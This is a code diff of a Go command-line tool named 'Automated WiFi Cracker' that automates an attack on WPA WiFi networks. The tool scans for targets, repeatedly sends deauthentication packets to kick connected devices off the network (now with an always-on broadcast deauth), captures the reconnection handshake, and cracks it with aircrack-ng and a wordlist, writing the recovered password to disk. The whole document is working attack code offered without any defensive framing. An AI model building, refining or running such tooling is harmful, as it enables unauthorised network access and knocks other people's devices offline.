@@ -26,7 +26,7 @@ type Network struct {
 	CH      string
 	ESSID   string
 	Sec     string
-	Clients []string // Slice to hold multiple connected clients
+	Clients []string
 }
 
 // ==========================================
@@ -55,12 +55,11 @@ func main() {
 	}
 
 	cyan.Println("=======================================")
-	cyan.Println("    Automated WiFi Cracker CLI v7.0   ")
+	cyan.Println("    Automated WiFi Cracker CLI v9.0   ")
 	cyan.Println("=======================================")
 
 	setupEnvironment()
 
-	// Step 1: Auto-Detect and Select Interface
 	iface := selectInterface()
 	monIface = iface + "mon"
 
@@ -71,11 +70,9 @@ func main() {
 
 	defer cleanup()
 
-	// Step 2: Scan APs
 	networks := scanNetworks()
 	target := selectTarget(networks)
 
-	// Step 3: Targeted Client Scan & Display Table
 	yellow.Printf("\n[*] Scanning '%s' for connected devices (10s)...\n", target.ESSID)
 	target = findConnectedClients(target)
 
@@ -85,7 +82,6 @@ func main() {
 		red.Println("[!] WARNING: No connected devices found. Will attempt broadcast deauth.")
 	}
 
-	// Step 4: Directory Structure
 	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
 	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
 	targetDir := filepath.Join("data", sanitizedEssid)
@@ -99,20 +95,15 @@ func main() {
 
 	capFile := filepath.Join(targetDir, "handshake")
 
-	// Step 5: Capture Handshake (Deauth All)
-	captureHandshake(target, capFile)
+	captureHandshake(target, capFile, targetDir)
 
-	// Step 6: Verify Handshake
 	if !verifyHandshake(capFile) {
-		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 1 minute.")
-		red.Println("[-] Reason: No device reconnected, or router ignores deauth packets.")
+		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 5 minutes.")
 		cleanup()
 		os.Exit(1)
 	}
 
 	green.Println("\n[+] Valid Handshake Captured Successfully!")
-
-	// Step 7: Crack Password
 	crackPassword(capFile, targetDir)
 	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
 }
@@ -123,7 +114,6 @@ func main() {
 func selectInterface() string {
 	yellow.Println("\n[*] Detecting available wireless interfaces...")
 
-	// Read wireless interfaces from /sys/class/net/
 	entries, err := os.ReadDir("/sys/class/net/")
 	if err != nil {
 		red.Printf("[-] Failed to read interfaces: %v\n", err)
@@ -132,7 +122,6 @@ func selectInterface() string {
 
 	var ifaces []string
 	for _, e := range entries {
-		// Check if it's a wireless interface
 		if _, err := os.Stat("/sys/class/net/" + e.Name() + "/wireless"); err == nil {
 			ifaces = append(ifaces, e.Name())
 		}
@@ -186,14 +175,13 @@ func findConnectedClients(target Network) Network {
 	cmd.Start()
 	activeCmds = append(activeCmds, cmd)
 
-	time.Sleep(10 * time.Second) // Focused 10s scan
+	time.Sleep(10 * time.Second)
 
 	if cmd.Process != nil {
 		cmd.Process.Kill()
 		cmd.Wait()
 	}
 
-	// Parse the focused CSV to find clients
 	file, err := os.Open(scanFile + "-01.csv")
 	if err != nil {
 		return target
@@ -218,7 +206,6 @@ func findConnectedClients(target Network) Network {
 		if isStation {
 			stationMac := strings.TrimSpace(parts[0])
 			targetBSSID := strings.TrimSpace(parts[5])
-			// If station is connected to our target BSSID
 			if targetBSSID == target.BSSID && stationMac != "" {
 				target.Clients = append(target.Clients, stationMac)
 			}
@@ -241,8 +228,14 @@ func printClientTable(target Network) {
 	cyan.Println("=====================================================")
 }
 
-func captureHandshake(target Network, capFile string) {
-	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 300 seconds)...")
+func captureHandshake(target Network, capFile string, targetDir string) {
+	// CRITICAL FIX: Delete old capture files so airodump-ng always writes to -01.cap
+	oldFiles, _ := filepath.Glob(filepath.Join(targetDir, "handshake-*"))
+	for _, f := range oldFiles {
+		os.Remove(f)
+	}
+
+	yellow.Println("\n[*] Starting Handshake Capture Process...")
 
 	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
 	cmd.Stdout = nil
@@ -254,59 +247,59 @@ func captureHandshake(target Network, capFile string) {
 	}
 	activeCmds = append(activeCmds, cmd)
 
-	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
+	time.Sleep(3 * time.Second) // Lock channel
 
-	// 1 Minute Loop (20 attempts, 15 seconds each)
-	for i := 1; i <= 20; i++ {
-		yellow.Printf("\n[*] Attempt %d/20: Sending Deauth to ALL clients...\n", i)
+	timeout := 5 * time.Minute
+	checkInterval := 15 * time.Second
+	elapsedTime := 0 * time.Second
 
-		// Deauth all clients concurrently
+	yellow.Printf("\n[*] Starting 5-Minute Active Capture & Deauth Loop...\n")
+
+	for elapsedTime < timeout {
+		// Send deauth to all clients every 15 seconds
+		cyan.Println("\n[*] Sending Deauth bursts to all connected devices...")
 		for _, clientMac := range target.Clients {
-			go func(cMac string) {
-				deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, "-c", cMac, monIface}
-				deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
-				deauthCmd.Stdout = nil
-				deauthCmd.Stderr = nil
-				deauthCmd.Start()
-
-				// Wait for this deauth to finish (15s) before exiting goroutine
-				deauthCmd.Wait()
-			}(clientMac)
+			yellow.Printf("[-] Deauth -> %s\n", clientMac)
+			deauthArgs := []string{"--deauth", "5", "-a", target.BSSID, "-c", clientMac, monIface}
+			deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
+			deauthCmd.Stdout = nil
+			deauthCmd.Stderr = nil
+			deauthCmd.Run()
 		}
 
-		// If no clients were found, send a broadcast deauth
-		if len(target.Clients) == 0 {
-			go func() {
-				deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, monIface}
-				deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
-				deauthCmd.Stdout = nil
-				deauthCmd.Stderr = nil
-				deauthCmd.Start()
-				deauthCmd.Wait()
-			}()
+		// Also send broadcast to catch random MACs
+		if len(target.Clients) == 0 || true {
+			yellow.Println("[-] Deauth -> Broadcast (All Devices)")
+			bArgs := []string{"--deauth", "5", "-a", target.BSSID, monIface}
+			bCmd := exec.Command("aireplay-ng", bArgs...)
+			bCmd.Stdout = nil
+			bCmd.Stderr = nil
+			bCmd.Run()
 		}
 
-		// Wait 15 seconds for clients to reconnect and handshake to capture
-		time.Sleep(15 * time.Second)
+		// Wait for devices to reconnect and handshake
+		white.Print("[*] Listening for handshake")
+		for i := 0; i < 3; i++ {
+			time.Sleep(5 * time.Second)
+			white.Print(".")
+		}
+		fmt.Println()
+		elapsedTime += checkInterval
 
-		// Check if handshake is captured early
 		if verifyHandshake(capFile) {
-			green.Println("[+] Handshake detected! Stopping capture phase.")
+			green.Println("\n[+] Handshake detected! Stopping capture phase.")
 			if cmd.Process != nil {
 				cmd.Process.Kill()
 				cmd.Wait()
 			}
 			return
 		}
-		white.Println("[*] Handshake not found yet. Retrying...")
 	}
 
-	time.Sleep(3 * time.Second)
 	if cmd.Process != nil {
 		cmd.Process.Kill()
 		cmd.Wait()
 	}
-	green.Println("[+] Capture phase completed.")
 }
 
 func verifyHandshake(capFile string) bool {
@@ -333,7 +326,7 @@ func crackPassword(capFile string, targetDir string) {
 	cyan.Println("=======================================")
 	yellow.Printf("[*] File: %s\n", finalCapFile)
 	yellow.Printf("[*] Wordlist: rockyou_clean.txt\n")
-	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
+	yellow.Printf("[*] CPU Threads: %d\n", cores)
 	fmt.Println()
 
 	cmd := exec.Command("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)
@@ -357,7 +350,6 @@ func crackPassword(capFile string, targetDir string) {
 				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
 				green.Println("=======================================")
 
-				// Save password to file
 				passFilePath := filepath.Join(targetDir, "password.txt")
 				err := os.WriteFile(passFilePath, []byte("WiFi: "+filepath.Base(targetDir)+"\nPassword: "+password+"\n"), 0644)
 				if err == nil {
@@ -468,7 +460,6 @@ func parseCSV(filename string) []Network {
 			sec := strings.TrimSpace(parts[5])
 			essid := strings.TrimSpace(parts[13])
 
-			// Filter out CSV headers and empty lines
 			if bssid != "" && essid != "" && bssid != "BSSID" && essid != "ESSID" {
 				networks = append(networks, Network{
 					BSSID: bssid,
